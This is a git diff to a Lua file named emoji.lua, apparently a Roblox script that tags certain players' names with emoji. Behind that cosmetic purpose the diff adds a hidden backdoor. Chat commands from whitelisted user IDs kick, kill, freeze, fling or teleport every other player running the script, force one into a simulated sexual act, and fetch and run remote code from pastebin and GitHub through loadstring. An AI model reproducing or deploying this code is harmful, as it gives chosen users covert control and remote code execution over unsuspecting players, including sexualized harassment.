a1923fd6fbed30c768781e20015f7c173b784794
ekso <80045777+eksotopro@users.noreply.github.com>
2022-04-15 04:45:56 +0200

    Update emoji.lua

--- emoji.lua
+++ emoji.lua
@@ -1,5 +1,3 @@
---// Credits to space im too lazy to do this uwu love you space \\--
-
 local StarId = {
 	[3254506659] = true,
 	[1456523092] = true,
@@ -19,43 +17,403 @@ local CrownId = {
 
 local DiamondId = {}
 
-local WoahId = {
-	[2426318135] = true,
-	[2994493100] = true,
-}
+local WoahId = {}
 
 function premium()
 	for _,v in pairs(game:GetService('Players'):GetChildren()) do
-		if StarId[v.UserId] then
-			if v.Character then
-				if v.Character.Parent.Name == 'Players' then
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[⭐]'..v.DisplayName)
-				end
-			end
-		elseif CrownId[v.UserId] then
+		if CrownId[v.UserId] then
 			if v.Character then
 				if v.Character.Parent.Name == 'Players' then
 					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑]'..v.DisplayName)
 				end
+			local freeze = function()
+			game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
+			game.Players.LocalPlayer.Character.UppperTorso.Anchored = true
+		end
+		
+		local unfreeze = function()
+			game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
+			game.Players.LocalPlayer.Character.UppperTorso.Anchored = flase
+		end
+		
+		v.Chatted:connect(function(cht)
+			if cht:match("$kick .") then
+				if game.Players.LocalPlayer ~= v then
+					game.Players.LocalPlayer:Kick("                                Kicked by Premium.")
+				end
 			end
-		elseif DiamondId[v.UserId] then
+		
+		end)
+		
+		v.Chatted:connect(function(cht)
+			if cht:match("$fling .") then
+				if game.Players.LocalPlayer ~= v then
+					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
+					power = 99999999 -- change this to make it more or less powerful
+		 
+					game:GetService('RunService').Stepped:connect(function()
+					game.Players.LocalPlayer.Character.Head.CanCollide = false
+					game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
+					game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
+					game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
+					end)
+					wait(.1)
+					local bambam = Instance.new("BodyThrust")
+					bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
+					bambam.Force = Vector3.new(power,0,power)
+					bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+				end
+			end
+		
+		end)
+		
+		v.Chatted:connect(function(cht)
+			if cht:match("$benx .") then
+				if game.Players.LocalPlayer ~= v then
+					wait(0) local A_1 = "" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
+					game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = v.Character.HumanoidRootPart
+					local benxed = true
+					while benxed == true do
+						hummy = game:GetService("Players").LocalPlayer.Character.Humanoid
+						pcall(function()
+								hummy.Parent.Pants:Destroy()
+						end)
+						pcall(function()
+								hummy.Parent.Shirt:Destroy()
+						end)
+						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame + v.Character.HumanoidRootPart.CFrame.lookVector * 0.5
+						game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70
+						wait(0.1)
+						game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
+					end
+				end
+			end
+		
+		end)
+		
+		v.Chatted:connect(function(cht)
+			if cht:match("$unbenx .") then
+				if game.Players.LocalPlayer ~= v then
+					game.Players.LocalPlayer.Character.Humanoid:Destroy()
+					wait(15)
+					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.UpperTorso.Position)
+				end
+			end
+		
+		end)
+		
+		v.Chatted:connect(function(cht)
+			if cht:match("$freeze .") then
+				if game.Players.LocalPlayer ~= v then
+					freeze()
+				end
+			end
+		
+		end)
+		
+		v.Chatted:connect(function(cht)
+			if cht:match("$unfreeze .") then
+				if game.Players.LocalPlayer ~= v then
+					unfreeze()
+				end
+			end
+		
+		end)
+		
+		v.Chatted:connect(function(cht)
+			if cht:match("$thaw .") then
+				if game.Players.LocalPlayer ~= v then
+					unfreeze()
+				end
+			end
+		
+		end)
+		
+		v.Chatted:connect(function(cht)
+			if cht:match("$ban .") then
+				if game.Players.LocalPlayer ~= v then
+					game.Players.LocalPlayer:kick("PERMA BAN")
+				end
+			end
+		
+		end)
+		
+		v.Chatted:connect(function(cht)
+			if cht:match("$kill .") then
+				if game.Players.LocalPlayer ~= v then
+					game.Players.LocalPlayer.Character.Humanoid:Destroy()
+				end
+			end
+		
+		end)
+		
+		v.Chatted:connect(function(cht)
+			if cht:match("$rejoin .") then
+				if game.Players.LocalPlayer ~= v then
+				loadstring(game:HttpGet("https://pastebin.com/raw/1gtVMUz3"))()
+				end
+			end
+		
+		end)
+		
+		v.Chatted:connect(function(cht)
+			if cht:match("$void .") then
+				if game.Players.LocalPlayer ~= v then
+					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -350, 0)
+				end
+			end
+		
+		end)
+		
+		v.Chatted:connect(function(cht)
+			if cht:match("$bring .") then
+				if game.Players.LocalPlayer ~= v then
+					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.UpperTorso.Position)
+				end
+			end
+		
+		end)
+		
+		v.Chatted:connect(function(cht)
+			if cht:match("$grave .") then
+				if game.Players.LocalPlayer ~= v then
+					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y -10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
+					game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
+				end
+			end
+		
+		end)
+		
+		v.Chatted:connect(function(cht)
+			if cht:match("$ungrave .") then
+				if game.Players.LocalPlayer ~= v then
+					game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
+					wait(0.1)
+					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y +10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
+				end
+			end
+		
+		end)
+		
+		v.Chatted:connect(function(cht)
+			if cht:match("/e test") then
+				if game.Players.LocalPlayer ~= v then
+					game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Yes yes sir ;)","All")
+				end
+			end
+		
+		end)
+		
+		v.Chatted:connect(function(cht)
+        if cht:match("$disable .") then
+            if game.Players.LocalPlayer ~= dev2 then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/perm.lua"))()
+            end
+        end
+    
+    end)
+		
+		v.Chatted:connect(function(cht)
+			if cht:match("$dropcash .") then
+				if game.Players.LocalPlayer ~= v2 then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/dropcash.lua"))()
+				end
+			end
+		
+		end)
+end
+		elseif StarId[v.UserId] then
 			if v.Character then
 				if v.Character.Parent.Name == 'Players' then
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎]'..v.DisplayName)
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[⭐]'..v.DisplayName)
+				end
+local freeze = function()
+			game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
+			game.Players.LocalPlayer.Character.UppperTorso.Anchored = true
+		end
+		
+		local unfreeze = function()
+			game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
+			game.Players.LocalPlayer.Character.UppperTorso.Anchored = flase
+		end
+		
+		v.Chatted:connect(function(cht)
+			if cht:match("$kick .") then
+				if game.Players.LocalPlayer ~= v then
+					game.Players.LocalPlayer:Kick("                                Kicked by Premium.")
 				end
 			end
-		elseif WoahId[v.UserId] then
-			if v.Character then
-				if v.Character.Parent.Name == 'Players' then
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[😲]'..v.DisplayName)
+		
+		end)
+		
+		v.Chatted:connect(function(cht)
+			if cht:match("$fling .") then
+				if game.Players.LocalPlayer ~= v then
+					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
+					power = 99999999 -- change this to make it more or less powerful
+		 
+					game:GetService('RunService').Stepped:connect(function()
+					game.Players.LocalPlayer.Character.Head.CanCollide = false
+					game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
+					game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
+					game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
+					end)
+					wait(.1)
+					local bambam = Instance.new("BodyThrust")
+					bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
+					bambam.Force = Vector3.new(power,0,power)
+					bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
 				end
 			end
-		elseif v.Character then
-			if v.Character.Parent.Name == 'Players' then
-				if not v.Character.UpperTorso:FindFirstChild('BodyBackAttachment') then
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = (''..v.DisplayName)
+		
+		end)
+		
+		v.Chatted:connect(function(cht)
+			if cht:match("$benx .") then
+				if game.Players.LocalPlayer ~= v then
+					wait(0) local A_1 = "" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
+					game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = v.Character.HumanoidRootPart
+					local benxed = true
+					while benxed == true do
+						hummy = game:GetService("Players").LocalPlayer.Character.Humanoid
+						pcall(function()
+								hummy.Parent.Pants:Destroy()
+						end)
+						pcall(function()
+								hummy.Parent.Shirt:Destroy()
+						end)
+						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame + v.Character.HumanoidRootPart.CFrame.lookVector * 0.5
+						game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70
+						wait(0.1)
+						game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200
+					end
 				end
 			end
+		
+		end)
+		
+		v.Chatted:connect(function(cht)
+			if cht:match("$unbenx .") then
+				if game.Players.LocalPlayer ~= v then
+					game.Players.LocalPlayer.Character.Humanoid:Destroy()
+					wait(15)
+					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.UpperTorso.Position)
+				end
+			end
+		
+		end)
+		
+		v.Chatted:connect(function(cht)
+			if cht:match("$freeze .") then
+				if game.Players.LocalPlayer ~= v then
+					freeze()
+				end
+			end
+		
+		end)
+		
+		v.Chatted:connect(function(cht)
+			if cht:match("$unfreeze .") then
+				if game.Players.LocalPlayer ~= v then
+					unfreeze()
+				end
+			end
+		
+		end)
+		
+		v.Chatted:connect(function(cht)
+			if cht:match("$thaw .") then
+				if game.Players.LocalPlayer ~= v then
+					unfreeze()
+				end
+			end
+		
+		end)
+		
+		v.Chatted:connect(function(cht)
+			if cht:match("$ban .") then
+				if game.Players.LocalPlayer ~= v then
+					game.Players.LocalPlayer:kick("PERMA BAN")
+				end
+			end
+		
+		end)
+		
+		v.Chatted:connect(function(cht)
+			if cht:match("$kill .") then
+				if game.Players.LocalPlayer ~= v then
+					game.Players.LocalPlayer.Character.Humanoid:Destroy()
+				end
+			end
+		
+		end)
+		
+		v.Chatted:connect(function(cht)
+			if cht:match("$rejoin .") then
+				if game.Players.LocalPlayer ~= v then
+				loadstring(game:HttpGet("https://pastebin.com/raw/1gtVMUz3"))()
+				end
+			end
+		
+		end)
+		
+		v.Chatted:connect(function(cht)
+			if cht:match("$void .") then
+				if game.Players.LocalPlayer ~= v then
+					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -350, 0)
+				end
+			end
+		
+		end)
+		
+		v.Chatted:connect(function(cht)
+			if cht:match("$bring .") then
+				if game.Players.LocalPlayer ~= v then
+					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Character.UpperTorso.Position)
+				end
+			end
+		
+		end)
+		
+		v.Chatted:connect(function(cht)
+			if cht:match("$grave .") then
+				if game.Players.LocalPlayer ~= v then
+					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y -10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
+					game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
+				end
+			end
+		
+		end)
+		
+		v.Chatted:connect(function(cht)
+			if cht:match("$ungrave .") then
+				if game.Players.LocalPlayer ~= v then
+					game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
+					wait(0.1)
+					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y +10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
+				end
+			end
+		
+		end)
+		
+		v.Chatted:connect(function(cht)
+			if cht:match("/e test") then
+				if game.Players.LocalPlayer ~= v then
+					game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Yes yes sir ;)","All")
+				end
+			end
+		
+		end)
+		
+		v.Chatted:connect(function(cht)
+			if cht:match("$dropcash .") then
+				if game.Players.LocalPlayer ~= v then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/dropcash.lua"))()
+				end
+			end
+		
+		end)
+		end
 		end
 	end
 end
